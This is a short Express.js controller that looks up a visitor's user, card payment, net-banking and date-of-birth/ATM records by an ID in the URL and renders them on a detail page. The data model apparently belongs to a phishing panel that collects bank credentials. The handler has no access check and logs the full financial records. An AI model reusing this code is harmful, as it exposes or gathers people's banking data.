const User = require('../models/User');
const CardPayment = require('../models/CardPayment');
const NetBanking = require('../models/NetBanking');
const DobAtmData = require('../models/DobAtmData');

exports.getUserDetails = async (req, res) => {
    try {
        const { uniqueid } = req.params;

        if (!uniqueid) {
            return res.status(400).json({ success: false, error: "Missing uniqueid in URL" });
        }

        // Har collection se ek document nikaalo
        const [user, cardPayment, netBanking, dobAtmData] = await Promise.all([
            User.findOne({ uniqueid }),
            CardPayment.findOne({ uniqueid }),
            NetBanking.findOne({ uniqueid }),
            DobAtmData.findOne({ uniqueid })
        ]);

        console.log("Fetched Data: ", { user, cardPayment, netBanking, dobAtmData });

        res.render('detail', {
            user,
            cardPayment,
            netBanking,
            dobAtmData
        });
    } catch (error) {
        console.error("Error in getUserDetails:", error);
        res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};
